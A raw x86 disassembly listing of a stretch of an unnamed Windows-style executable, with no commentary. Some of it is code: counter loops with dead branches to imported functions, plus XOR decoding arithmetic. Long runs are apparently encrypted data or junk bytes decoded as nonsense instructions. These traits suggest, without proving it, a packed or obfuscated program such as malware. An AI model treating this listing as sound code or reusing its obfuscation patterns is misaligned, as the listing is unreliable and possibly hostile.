  4082e0:	sub    DWORD PTR [ebx+0x51],ecx
  4082e3:	inc    ebx
  4082e4:	push   esi
  4082e5:	xchg   esi,eax
  4082e6:	mov    dh,0x1c
  4082e8:	mov    dh,0xe9
  4082ea:	inc    esi
  4082eb:	clc    
  4082ec:	cmp    al,0xec
  4082ee:	stos   DWORD PTR es:[edi],eax
  4082ef:	mov    cl,0x41
  4082f1:	xchg   esp,eax
  4082f2:	add    cl,bh
  4082f4:	loopne 0x40831e
  4082f6:	and    al,0x3
  4082f8:	iret   
  4082f9:	out    dx,eax
  4082fa:	pop    edx
  4082fb:	inc    eax
  4082fc:	cmp    ah,bh
  4082fe:	jle    0x4082e5
  408300:	imul   ecx,DWORD PTR [ecx+edx*8+0x1074131c],0xc
  408308:	xchg   ebx,eax
  408309:	scas   al,BYTE PTR es:[edi]
  40830a:	jecxz  0x40836e
  40830c:	adc    eax,0xd64ca316
  408311:	inc    eax
  408312:	add    BYTE PTR [ebx+0x8b0845],cl
  408318:	mov    ecx,DWORD PTR ds:0x40d64c
  40831e:	add    DWORD PTR [eax],ecx
  408320:	pop    esi
  408321:	pop    ebp
  408322:	ret    0x8
  408325:	push   ebp
  408326:	mov    ebp,esp
  408328:	sub    esp,0x58
  40832b:	and    DWORD PTR ds:0x4245ca,0x0
  408335:	jmp    0x408347
  40833a:	mov    ecx,DWORD PTR ds:0x4245ca
  408340:	inc    ecx
  408341:	mov    DWORD PTR ds:0x4245ca,ecx
  408347:	cmp    DWORD PTR ds:0x4245ca,0x1a
  40834e:	jae    0x408391
  408354:	cmp    DWORD PTR ds:0x4245ca,0xb
  40835b:	jne    0x40836c
  408361:	push   0x561f
  408366:	call   DWORD PTR ds:0x40d36c
  40836c:	cmp    DWORD PTR ds:0x4245ca,0xa
  408373:	jne    0x408386
  408379:	mov    ecx,DWORD PTR ds:0x4245ca
  40837f:	inc    ecx
  408380:	mov    DWORD PTR ds:0x4245ca,ecx
  408386:	jmp    0x40833a
  40838b:	inc    DWORD PTR ds:0x412370
  408391:	mov    ecx,DWORD PTR [ebp+0x8]
  408394:	and    DWORD PTR ds:0x417e55,0x0
  40839e:	jmp    0x4083b1
  4083a3:	xor    eax,eax
  4083a5:	or     eax,DWORD PTR ds:0x417e55
  4083ab:	inc    eax
  4083ac:	mov    ds:0x417e55,eax
  4083b1:	cmp    DWORD PTR ds:0x417e55,0x1f
  4083b8:	jae    0x4083df
  4083be:	cmp    DWORD PTR ds:0x417e55,0x21
  4083c5:	jne    0x4083d4
  4083cb:	push   DWORD PTR [ebp-0x14]
  4083ce:	call   DWORD PTR ds:0x40d008
  4083d4:	jmp    0x4083a3
  4083d9:	sub    DWORD PTR ds:0x4245ca,edi
  4083df:	mov    eax,0x8a43
  4083e4:	sub    DWORD PTR ds:0x415101,0x2da0
  4083ee:	jmp    0x408517
  4083f3:	dec    ecx
  4083f4:	pushf  
  4083f5:	push   esp
  4083f6:	in     eax,dx
  4083f7:	imul   esp,ebp,0x9f63b859
  4083fd:	mov    DWORD PTR [eax+eiz*8+0x61c988a5],ebp
  408404:	adc    al,0x7e
  408406:	jle    0x408412
  408408:	jg     0x408488
  40840a:	jle    0x408401
  40840c:	(bad)  
  40840e:	ins    DWORD PTR es:[edi],dx
  40840f:	jae    0x4083e3
  408411:	les    ebx,FWORD PTR [ebx+0x1186874b]
  408417:	adc    dl,BYTE PTR [ecx+ecx*1+0x7fcff48]
  40841e:	out    dx,eax
  40841f:	and    ebx,DWORD PTR [esp+eax*1-0x67911fc6]
  408426:	enter  0xd4a9,0x3b
  40842a:	test   BYTE PTR [eax-0x1c],ah
  40842d:	retf   0x2b0
  408430:	inc    edi
  408431:	enter  0xcdd1,0xa0
  408435:	pop    ds
  408436:	fwait
  408437:	mov    edi,DWORD PTR [esi-0x72]
  40843a:	aas    
  40843b:	jmp    0xd2c1281
  408440:	add    DWORD PTR [edi+ebx*8],esp
  408443:	cmp    eax,0x745e3b84
  408448:	mov    ch,al
  40844a:	cmp    BYTE PTR [ebx-0x5aabc125],0x5
  408451:	test   DWORD PTR [esi+0x6],esi
  408454:	retf   0xc22d
  408457:	mov    cl,0x8b
  408459:	adc    bh,BYTE PTR [esi-0x13]
  40845c:	and    BYTE PTR [ecx-0xdb832d6],0xb5
  408463:	in     al,0xef
  408465:	mov    WORD PTR [edx],ss
  408467:	rol    BYTE PTR [edx-0x29abd8c0],0x7d
  40846e:	(bad)
  408471:	inc    edi
  408472:	add    al,0x48
  408474:	jmp    0x408479
  408476:	cld    
  408477:	mov    bl,0xf4
  408479:	call   0xe904ad1a
  40847e:	scas   eax,DWORD PTR es:[edi]
  40847f:	push   ss
  408480:	mov    al,0x5b
  408482:	jle    0x408451
  408484:	inc    esi
  408485:	das    
  408486:	les    eax,FWORD PTR es:[ebp+0x1173ba0c]
  40848d:	stos   BYTE PTR es:[edi],al
  40848e:	mov    ah,0x47
  408490:	jmp    0x9ab2:0xe6373d96
  408497:	xchg   edx,eax
  408498:	fprem  
  40849a:	cwde   
  40849b:	push   0xffffff80
  40849d:	xor    BYTE PTR [ebp+0x7f],cl
  4084a0:	into   
  4084a1:	in     eax,dx
  4084a2:	pushf  
  4084a3:	in     al,0xac
  4084a5:	inc    esi
  4084a6:	call   0x264d:0x136cb28a
  4084ad:	loop   0x40846c
  4084af:	pmaxub mm6,QWORD PTR [esi-0x4403f8fe]
  4084b6:	lods   al,BYTE PTR ds:[esi]
  4084b7:	arpl   WORD PTR [edi],si
  4084b9:	out    0xbc,eax
  4084bb:	ja     0x4084ca
  4084bd:	xchg   edi,eax
  4084be:	mov    dl,0x86
  4084c0:	mov    eax,0xc7fb7194
  4084c5:	lods   eax,DWORD PTR ds:[esi]
  4084c6:	in     eax,dx
  4084c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084c9:	in     eax,dx
  4084ca:	xor    DWORD PTR ds:0xd7bec692,edi
  4084d0:	ins    DWORD PTR es:[edi],dx
  4084d1:	jo     0x40848d
  4084d3:	cmp    eax,0xde897999
  4084d8:	outs   dx,DWORD PTR ds:[esi]
  4084d9:	cld    
  4084da:	std    
  4084db:	daa    
  4084dc:	test   dh,dh
  4084de:	pop    ebx
  4084df:	xor    ebx,edx
  4084e1:	cmp    al,0x76
  4084e3:	retf   0xb32d
  4084e6:	sub    dh,ch
  4084e8:	xor    BYTE PTR [esp+ebp*1-0x681114ee],dh
  4084ef:	dec    esi
  4084f0:	stos   DWORD PTR es:[edi],eax
  4084f1:	mov    ebx,0xf14fa59e
  4084f6:	call   0x942a08d5
  4084fb:	ins    DWORD PTR es:[edi],dx
  4084fc:	int3   
  4084fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084fe:	inc    edi
  4084ff:	and    cl,0x6
  408502:	add    esp,DWORD PTR [eax+0x2]
  408505:	sub    al,0x27
  408507:	mov    eax,esi
  408509:	push   ecx
  40850a:	add    edx,DWORD PTR [edi+0x28]
  40850d:	sbb    ebp,DWORD PTR [edx]
  40850f:	outs   dx,BYTE PTR ds:[esi]
  408510:	clc    
  408511:	enter  0xd735,0x6e
  408515:	fmul   QWORD PTR [ebp+0x66]
  408518:	xor    eax,DWORD PTR [ecx+0x20]
  40851b:	mov    ecx,0x3b0a
  408520:	not    DWORD PTR ds:0x41abce
  408526:	add    ax,cx
  408529:	mov    ecx,DWORD PTR ds:0x417e49
  40852f:	or     ecx,DWORD PTR ds:0x412374
  408535:	mov    DWORD PTR ds:0x417e49,ecx
  40853b:	jmp    0x408664
  408540:	sub    cl,BYTE PTR [ebp-0x31]
  408543:	xchg   esp,eax
  408544:	jns    0x4084da
  408546:	jns    0x408589
  408548:	or     eax,0xef26a896
  40854d:	fmul   QWORD PTR [edx+0x69]
  408550:	jge    0x40857c
  408552:	jle    0x4085d2
  408554:	or     bh,BYTE PTR [edi+0x7e]
  408557:	jle    0x4085d7
  408559:	scas   eax,DWORD PTR es:[edi]
  40855a:	push   ecx
  40855b:	dec    eax
  40855c:	fild   DWORD PTR ds:0x3bf1b01a
  408562:	lock mov eax,ds:0x65eb4d94
  408568:	es push esi
  40856a:	mov    ebx,0x34ffb781
  40856f:	push   ebx
  408570:	ucomiss xmm5,DWORD PTR [ecx+eiz*2+0x17]
  408575:	pop    ss
  408576:	sbb    ah,BYTE PTR [edx]
  408578:	ror    BYTE PTR [ecx+0x248675a5],1
  40857e:	mov    cl,0x54
  408580:	mov    bl,0x8
  408582:	and    DWORD PTR ds:0xb16cfd6a,0xffffff9a
  408589:	and    edi,ebp
  40858b:	dec    edx
  40858c:	adc    ecx,DWORD PTR [eax-0x27]
  40858f:	imul   edx,DWORD PTR [ebx-0x5379486a],0xfffffff7
  408596:	cdq    
  408597:	repnz lahf 
  408599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40859a:	jmp    FWORD PTR [ebx+0x539f82ef]
  4085a0:	lock xor al,0xd9
  4085a3:	xchg   esp,eax
  4085a4:	jmp    0x198cd66c
  4085a9:	stc    
  4085aa:	push   eax
  4085ab:	scas   al,BYTE PTR es:[edi]
  4085ac:	sbb    BYTE PTR [ecx-0x3d],ah
  4085af:	and    eax,0x475b7f3
  4085b4:	retf   
  4085b5:	or     eax,0x753e1ed6
  4085ba:	mov    ebp,0x1784c33f
  4085bf:	arpl   WORD PTR [edx-0x24],sp
  4085c2:	fidiv  DWORD PTR [ecx-0x5b]
  4085c5:	fwait
  4085c6:	mov    ah,0xad
  4085c8:	imul   DWORD PTR [esi]
  4085ca:	out    dx,eax
  4085cb:	call   0xb9dcb937
  4085d0:	mov    bh,0xaa
  4085d2:	lock es in al,0x56
  4085d6:	fs mov cl,0xb1
  4085d9:	mul    ah
  4085db:	ret    
  4085dc:	(bad)  
  4085dd:	in     al,0xdb
  4085df:	push   es
  4085e0:	inc    esi
  4085e1:	neg    DWORD PTR [ebx-0x52bd0b8c]
  4085e7:	ror    DWORD PTR ds:0xfad94fc5,1
  4085ed:	int3   
  4085ee:	scas   eax,DWORD PTR es:[edi]
  4085ef:	pop    ecx
  4085f0:	mov    eax,ds:0x23a15868
  4085f5:	or     eax,0x7115ccc4
  4085fa:	pop    es
  4085fb:	fwait
  4085fc:	xlat   BYTE PTR ds:[ebx]
  4085fd:	(bad)  
  4085fe:	jno    0x4085f2
  408600:	lahf   
  408601:	fwait
  408602:	mov    bl,0x20
  408604:	enter  0x1913,0x4f
  408608:	xchg   edx,eax
  408609:	adc    edx,ebp
  40860b:	jae    0x4085a7
  40860d:	into   
  40860e:	not    DWORD PTR [ecx+0x41]
  408611:	mov    bh,0xd7
  408613:	jl     0x4085d0
  408615:	or     edx,DWORD PTR [ebp-0x6b6e4176]
  40861b:	cwde   
  40861c:	push   ecx
  40861d:	data16 mov ah,0xe
  408620:	rol    DWORD PTR [esi+edi*2-0x7e],0x32
  408625:	les    esp,FWORD PTR [esp+eax*4]
  408628:	push   ebp
  408629:	test   BYTE PTR [esp+ebx*2+0x69ce5728],bl
  408630:	pop    ds
  408631:	mov    ch,0x7c
  408633:	dec    esi
  408634:	cmp    BYTE PTR [edi],dl
  408636:	fs ret 0x66e5
  40863a:	daa    
  40863b:	push   edi
  40863c:	push   esp
  40863d:	(bad)  
  40863f:	fprem  
  408641:	mov    ds:0xc853e8e4,eax
  408646:	fimul  WORD PTR [ecx]
  408648:	xchg   esi,eax
  408649:	jnp    0x408695
  40864b:	adc    dl,cl
  40864d:	jbe    0x40866f
  40864f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408650:	add    DWORD PTR [ebx],0x11
  408653:	test   BYTE PTR [ecx],bl
  408655:	mov    edx,0x6c4b41b7
  40865a:	jnp    0x408608
  40865c:	aas    
  40865d:	jnp    0x408670
  40865f:	shr    BYTE PTR [ecx],1
  408661:	xchg   esi,eax
  408662:	sti    
  408663:	dec    edi
  408664:	movzx  eax,ax
  408667:	add    ecx,DWORD PTR ds:0x417e49
  40866d:	mov    DWORD PTR [ebp-0xc],eax
  408670:	mov    BYTE PTR [ebp-0x1],0x7f
  408674:	lea    eax,[ebp-0x1]
  408677:	and    DWORD PTR ds:0x4245c6,edx
  40867d:	mov    DWORD PTR [ebp-0x10],eax
  408680:	mov    DWORD PTR ds:0x41510d,0x1a
  40868a:	cmp    DWORD PTR ds:0x41510d,0x0
  408691:	je     0x4086bf
  408697:	cmp    DWORD PTR ds:0x41510d,0x25
  40869e:	jne    0x4086ad
  4086a4:	push   DWORD PTR [ebp-0x18]
  4086a7:	call   DWORD PTR ds:0x40d370
  4086ad:	mov    ecx,DWORD PTR ds:0x41510d
  4086b3:	dec    ecx
  4086b4:	mov    DWORD PTR ds:0x41510d,ecx
  4086ba:	jmp    0x40868a
  4086bf:	mov    al,BYTE PTR [ebp-0x1]
  4086c2:	and    DWORD PTR ds:0x4150fd,0x0
  4086cc:	mov    ecx,DWORD PTR ds:0x4150fd
  4086d2:	inc    ecx
  4086d3:	mov    DWORD PTR ds:0x4150fd,ecx
  4086d9:	cmp    DWORD PTR ds:0x4150fd,0x11
  4086e0:	jne    0x4086f1
  4086e6:	push   0x41ad87
  4086eb:	call   DWORD PTR ds:0x40d1e4
  4086f1:	cmp    DWORD PTR ds:0x4150fd,0x10
  4086f8:	jne    0x40870b
  4086fe:	mov    ecx,DWORD PTR ds:0x4150fd
  408704:	inc    ecx
  408705:	mov    DWORD PTR ds:0x4150fd,ecx
  40870b:	cmp    DWORD PTR ds:0x4150fd,0x1f
  408712:	jb     0x4086cc
  408718:	neg    ecx
  40871a:	mov    ecx,DWORD PTR [ebp-0x10]
  40871d:	xor    al,0x4a
  40871f:	or     DWORD PTR ds:0x41abe2,0x415105
  408729:	sub    al,0x34
  40872b:	mov    BYTE PTR [ecx],al
  40872d:	xor    ecx,ecx
  40872f:	jmp    0x408858
  408734:	adc    DWORD PTR [ebx+0xc],ebx
  408737:	(bad)  
  408738:	fs pop ecx
  40873a:	jmp    0x44b4d3b8
  40873f:	ficomp DWORD PTR [esp+eiz*2+0x2b0936b8]
  408746:	jle    0x4087c6
  408748:	or     bh,BYTE PTR [edi+0x7e]
  40874b:	jle    0x40874e
  40874d:	xchg   edi,eax
  40874e:	mov    ecx,0xb7c813da
  408753:	aam    0xd4
  408755:	sbb    ch,bh
  408757:	pop    eax
  408758:	push   edi
  408759:	xor    BYTE PTR [edi+0x4e],0x25
  40875d:	ins    BYTE PTR es:[edi],dx
  40875e:	or     edi,DWORD PTR [esi]
  408760:	push   eax
  408761:	jmp    0x408737
  408763:	pcmpeqd mm3,QWORD PTR [ebp+ebx*8-0xc]
  408768:	dec    ebp
  408769:	ins    DWORD PTR es:[edi],dx
  40876a:	mov    es,WORD PTR [ecx-0x47]
  40876d:	jb     0x4087a9
  40876f:	cmp    ah,ch
  408771:	in     al,0x5a
  408773:	xchg   edx,eax
  408774:	mov    WORD PTR [ecx-0x4ae3d289],ss
  40877a:	and    ebx,DWORD PTR [edx+0x2e]
  40877d:	aas    
  40877e:	pop    eax
  40877f:	imul   eax,DWORD PTR [ecx-0x1188ffcd],0x1b84ef75
  408789:	out    dx,eax
  40878a:	gs clc 
  40878c:	fcmovbe st,st(5)
  40878e:	dec    eax
  40878f:	imul   edi,ecx,0xb2560717
  408795:	cmc    
  408796:	mov    ebx,0x1e028934
  40879b:	ds adc al,0xdb
  40879e:	lock fadd QWORD PTR [edi+0x447e5b06]
  4087a5:	push   ebp
  4087a6:	mov    es,WORD PTR [ebx+0x68]
  4087a9:	adc    al,0xbb
  4087ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087ac:	sub    BYTE PTR [edi-0x2857abd9],dl
  4087b2:	gs dec ebp
  4087b4:	test   eax,0x9bffaa2a
  4087b9:	ret    0x544f
  4087bc:	inc    edi
  4087bd:	into   
  4087be:	inc    ebp
  4087bf:	pop    eax
  4087c0:	inc    esp
  4087c1:	mov    ebx,0xe263a800
  4087c6:	cli    
  4087c7:	push   0x37
  4087c9:	outs   dx,BYTE PTR ds:[esi]
  4087ca:	loope  0x4087e6
  4087cc:	sub    esi,DWORD PTR [ebp+0x6cb801b4]
  4087d2:	add    esp,edi
  4087d4:	sub    al,BYTE PTR [esi]
  4087d6:	stc    
  4087d7:	mov    dl,0xb1
  4087d9:	inc    edx
  4087da:	adc    eax,0x7e75626f
  4087df:	pusha  
  4087e0:	adc    al,0x6a
  4087e2:	mul    edx
  4087e4:	push   ds
  4087e5:	(bad)  
  4087e6:	dec    eax
  4087e7:	test   DWORD PTR gs:[esi],0xd662136
  4087ee:	call   0x48d3:0x8107c953
  4087f5:	dec    esi
  4087f6:	pop    eax
  4087f7:	push   edi
  4087f8:	mov    ebx,0xd14b52f2
  4087fd:	scas   eax,DWORD PTR es:[edi]
  4087fe:	mov    ebx,0xc20b93b4
  408803:	lods   al,BYTE PTR ds:[esi]
  408804:	jp     0x40884b
  408806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408807:	ja     0x408809
  408809:	fdiv   st(4),st
  40880b:	push   es
  40880c:	mov    ds:0x904419a9,eax
  408811:	dec    ecx
  408812:	aam    0x4c
  408814:	es jge 0x408821
  408817:	and    eax,0x97c8d492
  40881c:	mov    ch,BYTE PTR [eax-0x5b6e5b9f]
  408822:	jmp    0x912d:0x264a6741
  408829:	mov    bl,ch
  40882b:	mov    ebx,0xdee0bd2
  408830:	pop    ds
  408831:	cmp    al,BYTE PTR [edi]
  408833:	ja     0x4088a9
  408835:	inc    ebx
  408836:	lods   eax,DWORD PTR ds:[esi]
  408837:	add    bl,0xf7
  40883a:	stos   BYTE PTR es:[edi],al
  40883b:	and    ebx,DWORD PTR [ebx+0x3c1f9e03]
  408841:	shr    DWORD PTR [edx-0x52717eb2],cl
  408847:	jecxz  0x40882f
  408849:	mul    DWORD PTR [ebx-0x7d7edce7]
  40884f:	ss jge 0x40881a
  408852:	add    BYTE PTR [esi],ch
  408854:	sbb    eax,0xc7a4b0b4
  408859:	inc    ebp
  40885a:	clc    
  40885b:	cmp    BYTE PTR [ebp+0x1581f89c],al
  408861:	jo     0x408886
  408863:	inc    ecx
  408864:	add    BYTE PTR [esi-0x38ffffe9],al
  40886a:	inc    ebp
  40886b:	lock cmp eax,DWORD PTR [ebp+0x458bf89c]
  408872:	clc    
  408873:	xor    ecx,ecx
  408875:	add    ecx,DWORD PTR ds:0x417e59
  40887b:	sbb    DWORD PTR ds:0x41abde,ecx
  408881:	mov    ecx,0x7510859
  408886:	add    DWORD PTR ds:0x41abe6,0x417e51
  408890:	push   esi
  408891:	and    DWORD PTR ds:0x417e59,0x0
  40889b:	mov    esi,DWORD PTR ds:0x417e59
  4088a1:	inc    esi
  4088a2:	mov    DWORD PTR ds:0x417e59,esi
  4088a8:	cmp    DWORD PTR ds:0x417e59,0x9
  4088af:	jne    0x4088f1
  4088b5:	push   0x41ad06
  4088ba:	push   DWORD PTR [ebp-0x10]
  4088bd:	push   DWORD PTR [ebp-0x14]
  4088c0:	push   0x6f38
  4088c5:	push   0x208a
  4088ca:	push   0x8fdb
  4088cf:	push   0x1d69
  4088d4:	push   DWORD PTR [ebp-0x20]
  4088d7:	push   0x57cc
  4088dc:	push   DWORD PTR [ebp-0x10]
  4088df:	push   DWORD PTR [ebp-0x28]
  4088e2:	push   DWORD PTR [ebp-0x24]
  4088e5:	push   DWORD PTR [ebp-0x28]
  4088e8:	push   DWORD PTR [ebp-0x1c]
  4088eb:	call   DWORD PTR ds:0x40d374
  4088f1:	cmp    DWORD PTR ds:0x417e59,0x8
  4088f8:	jne    0x40890d
  4088fe:	xor    esi,esi
  408900:	add    esi,DWORD PTR ds:0x417e59
  408906:	inc    esi
  408907:	mov    DWORD PTR ds:0x417e59,esi
  40890d:	cmp    DWORD PTR ds:0x417e59,0x13
  408914:	jb     0x40889b
  40891a:	xor    eax,ecx
  40891c:	mov    esi,0x32729f
  408921:	add    eax,esi
  408923:	jmp    0x408930
  408928:	mov    dl,BYTE PTR [ebp-0x1]
  40892b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40892f:	inc    eax
  408930:	cmp    eax,0x40
  408933:	jb     0x408928
  408939:	mov    edx,DWORD PTR [ebp-0x8]
  40893c:	mov    eax,DWORD PTR [ebp-0xc]
  40893f:	jmp    0x408a68
  408944:	sub    eax,0xb98f82f6
  408949:	fwait
  40894a:	and    DWORD PTR [eax+eax*1+0xdd74167],edx
  408951:	data16 mov ah,0xf2
  408954:	add    eax,0xa7e7e28
  408959:	jg     0x4089d9
  40895b:	jle    0x4089cf
  40895d:	dec    esp
  40895e:	push   ds
  40895f:	adc    eax,0xd2a2e4c
  408964:	mov    ah,bl
  408966:	inc    esi
  408967:	jmp    0x9743:0x46d8549
  40896e:	adc    BYTE PTR [esi-0x67],dh
  408971:	mul    BYTE PTR [ecx+eax*8]
  408974:	dec    edi
  408975:	xor    eax,0x6686464f
  40897a:	sub    ecx,DWORD PTR [esi-0x53]
  40897d:	iret   
  40897e:	adc    ecx,ecx
  408980:	and    al,0xfa
  408982:	cmp    bh,BYTE PTR [ecx-0x49]
  408985:	push   es
  408986:	nop
  408987:	mov    dh,BYTE PTR [ebp-0x7c]
  40898a:	test   BYTE PTR [edx-0x4a],0xe1
  40898e:	mov    cl,0x24
  408990:	mov    gs,WORD PTR [esi-0x76]
  408993:	inc    ecx
  408994:	cmc    
  408995:	rcl    BYTE PTR [eax+0x63b4895b],1
  40899b:	test   BYTE PTR [edx-0x24],0x3c
  40899f:	fld    DWORD PTR [esi+0x0]
  4089a2:	das    
  4089a3:	out    0x3a,al
  4089a5:	sbb    ecx,DWORD PTR [edi+0x61d4318b]
  4089ab:	xchg   ecx,eax
  4089ac:	gs mov ecx,0x1cf0556
  4089b2:	shr    edi,1
  4089b4:	pop    eax
  4089b5:	ins    DWORD PTR es:[edi],dx
  4089b6:	pop    esi
  4089b7:	lock or BYTE PTR [ebx+0xfe61af4],bh
  4089be:	jp     0x408a0c
  4089c0:	mov    ebp,DWORD PTR [ebx+edi*2+0x1b]
  4089c4:	lods   eax,DWORD PTR ds:[esi]
  4089c5:	fimul  DWORD PTR [ebp+0x42]
  4089c8:	dec    ebx
  4089c9:	ror    BYTE PTR [eax+0xc7682a8],0xf9
  4089d0:	push   edx
  4089d1:	out    0x6e,al
  4089d3:	jmp    0x21bb601d
  4089d8:	call   0xdff1:0x36e8d597
  4089df:	cmp    BYTE PTR [esi],ah
  4089e1:	gs ret 
  4089e3:	int    0x14
  4089e5:	mov    al,ds:0xba48b169
  4089ea:	mov    ecx,DWORD PTR [ecx+0x49]
  4089ed:	xor    al,0x39
  4089ef:	add    bl,BYTE PTR [edi+0x16963cda]
  4089f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089f6:	sti    
  4089f7:	ret    
  4089f8:	sbb    BYTE PTR [ebx+0x66],dh
  4089fb:	jp     0x4089b6
  4089fd:	inc    edi
  4089fe:	out    0x8b,al
  408a00:	iret   
  408a01:	gs je  0x408a70
  408a04:	outs   dx,DWORD PTR ds:[esi]
  408a05:	push   ecx
  408a06:	mov    ebp,0xbc7fbc30
  408a0b:	hlt    
  408a0c:	cmp    bh,0x23
  408a0f:	dec    esi
  408a10:	and    DWORD PTR [ebp-0x5d],esi
  408a13:	pop    ecx
  408a14:	mov    edi,0x35f303e6
  408a19:	repnz push 0x55b51e10
  408a1f:	test   al,0xd
  408a21:	into   
  408a22:	jne    0x408a62
  408a24:	xacquire xchg BYTE PTR es:[ecx+eiz*1],dl
  408a29:	lods   al,BYTE PTR ds:[esi]
  408a2a:	(bad)  
  408a2b:	fisubr WORD PTR [ebx-0x13]
  408a2e:	fstp   QWORD PTR [ebx+edx*4]
  408a31:	and    ebp,DWORD PTR [esi]
  408a33:	and    ah,ch
  408a35:	ss ins BYTE PTR es:[edi],dx
  408a37:	mov    esi,eax
  408a39:	mov    al,0x22
  408a3b:	sbb    al,0x5c
  408a3d:	cmp    eax,0xd206f2f8
  408a42:	lock jnp 0x4089ea
  408a45:	sti    
  408a46:	daa    
  408a47:	repnz and eax,0x7a0646b9
  408a4d:	xchg   esp,eax
  408a4e:	das    
  408a4f:	add    ecx,DWORD PTR [edi-0x7a0d7b4f]
  408a55:	xchg   ebp,eax
  408a56:	cmp    eax,0x31d85a99
  408a5b:	(bad)  [ebx-0x2c]
  408a5e:	and    al,BYTE PTR [eax-0x62197132]
  408a64:	jp     0x4089ed
  408a66:	loop   0x408ab5
  408a68:	xor    edx,ecx
  408a6a:	add    edx,esi
  408a6c:	cmp    edx,eax
  408a6e:	je     0x408d06
  408a74:	jmp    0x408b9d
  408a79:	xor    ecx,DWORD PTR [edx+ebx*1-0x14]
  408a7d:	cdq    
  408a7e:	js     0x408a69
  408a80:	popa   
  408a81:	cmp    ax,0xba8d
  408a85:	push   edi
  408a86:	in     al,dx
  408a87:	add    al,0xbb
  408a89:	adc    DWORD PTR [ecx],ebp
  408a8b:	jle    0x408b0b
  408a8d:	or     bh,BYTE PTR [edi+0x7e]
  408a90:	jle    0x408a6a
  408a92:	or     DWORD PTR [ecx],0x4d4380e2
  408a98:	mov    dh,0x28
  408a9a:	pop    ecx
  408a9b:	xor    BYTE PTR [ebp-0x1e],0xfb
  408a9f:	nop
  408aa0:	jbe    0x408abb
  408aa2:	lods   eax,DWORD PTR ds:[esi]
  408aa3:	push   edi
  408aa4:	scas   eax,DWORD PTR es:[edi]
  408aa5:	jge    0x408af5
  408aa7:	or     cl,al
  408aa9:	sbb    BYTE PTR ds:0x18267837,dh
  408aaf:	or     eax,DWORD PTR [eax+eiz*4]
  408ab2:	retf   0xa829
  408ab5:	jne    0x408b27
  408ab7:	xchg   ebp,eax
  408ab8:	push   cs
  408ab9:	sub    esp,DWORD PTR [ecx-0x2e]
  408abc:	jmp    0xccee:0xec827426
  408ac3:	jb     0x408a92
  408ac5:	mov    dh,BYTE PTR [eax]
  408ac7:	and    DWORD PTR [edi+ecx*8-0x3e],ecx
  408acb:	jae    0x408adb
  408acd:	es fs pop ds
  408ad0:	push   edi
  408ad1:	fsubr  QWORD PTR ds:0xed86b837
  408ad7:	push   edx
  408ad8:	pop    esi
  408ad9:	jnp    0x408a8a
  408adb:	js     0x408b47
  408add:	or     ebp,eax
  408adf:	adc    dh,dh
  408ae1:	adc    eax,0x1b6d863a
  408ae6:	mov    ds:0xeaf31a6e,eax
  408aeb:	push   ebp
  408aec:	mov    eax,0x945b4bf2
  408af1:	xor    bh,al
  408af3:	sti    
  408af4:	rcl    ecx,1
  408af6:	sub    ah,BYTE PTR [edx-0x27a62a48]
  408afc:	test   edx,esi
  408afe:	cmp    BYTE PTR [edi-0x70],dh
  408b01:	mov    edi,0x7099040
  408b06:	scas   al,BYTE PTR es:[edi]
  408b07:	loopne 0x408b7c
  408b09:	pusha  
  408b0a:	popf   
  408b0b:	xor    DWORD PTR [edi],esp
  408b0d:	stos   DWORD PTR es:[edi],eax
  408b0e:	(bad)  
  408b0f:	adc    al,0x73
  408b11:	mov    bh,0x6d
  408b13:	mov    eax,DWORD PTR [ecx-0x72]
  408b16:	add    dl,dl
  408b18:	hlt    
  408b19:	(bad)  
  408b1b:	rcr    DWORD PTR [edi+0x458aa25c],1
  408b21:	cmp    al,BYTE PTR [edx-0x20ca4f95]
  408b27:	rol    ch,1
  408b29:	mov    dl,0x87
  408b2b:	in     al,dx
  408b2c:	nop
  408b2d:	push   eax
  408b2e:	pop    eax
  408b2f:	xor    esp,DWORD PTR [ebx+0x5d804113]
  408b35:	retf   
  408b36:	jbe    0x408af5
  408b38:	jno    0x408bb5
  408b3a:	jge    0x408ac2
  408b3c:	and    al,0x22
  408b3e:	pushf  
  408b3f:	aaa    
  408b40:	jge    0x408b35
  408b42:	mov    ?,eax
  408b44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b45:	sub    al,0xc
  408b47:	dec    edx
  408b48:	fdiv   DWORD PTR [eax]
  408b4a:	popf   
  408b4b:	push   ecx
  408b4c:	push   eax
  408b4d:	mov    bh,0xf9
  408b4f:	aaa    
  408b50:	in     al,0x73
  408b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b53:	ins    DWORD PTR es:[edi],dx
  408b54:	mov    ebx,0xf30fd884
  408b59:	retf   0xdf40
  408b5c:	or     DWORD PTR [esi],ebx
  408b5e:	(bad)  
  408b5f:	xchg   edi,eax
  408b60:	xchg   ecx,eax
  408b61:	and    ah,BYTE PTR [edi+0x7bb71c9d]
  408b67:	test   DWORD PTR [esi-0x3b],eax
  408b6a:	jecxz  0x408b70
  408b6c:	(bad)  
  408b6d:	out    dx,al
  408b6e:	not    DWORD PTR [esi]
  408b70:	jmp    0xbae7ee79
  408b75:	enter  0xe07a,0x4c
  408b79:	loop   0x408ba2
  408b7b:	mov    cl,0x25
  408b7d:	ja     0x408be7
  408b7f:	xchg   edx,eax
  408b80:	or     BYTE PTR [ecx],0x1a
  408b83:	inc    ebp
  408b84:	imul   esi,DWORD PTR [esi],0x286de7d7
  408b8a:	lods   eax,DWORD PTR ds:[esi]
  408b8b:	inc    ebp
  408b8c:	mov    dl,0xec
  408b8e:	inc    eax
  408b8f:	xlat   BYTE PTR ds:[ebx]
  408b90:	sbb    al,0x24
  408b92:	aam    0xf7
  408b94:	sti    
  408b95:	push   eax
  408b96:	fild   DWORD PTR [esi+ecx*1]
  408b99:	ins    BYTE PTR es:[di],dx
  408b9b:	or     esi,ebx
  408b9d:	push   ebx
  408b9e:	push   edi
  408b9f:	mov    edi,DWORD PTR [ebp+0x8]
  408ba2:	mov    eax,0x8a43
  408ba7:	xor    ax,WORD PTR [edi+edx*4+0x2]
  408bac:	mov    edi,0x3b0a
  408bb1:	add    ax,di
  408bb4:	movzx  eax,ax
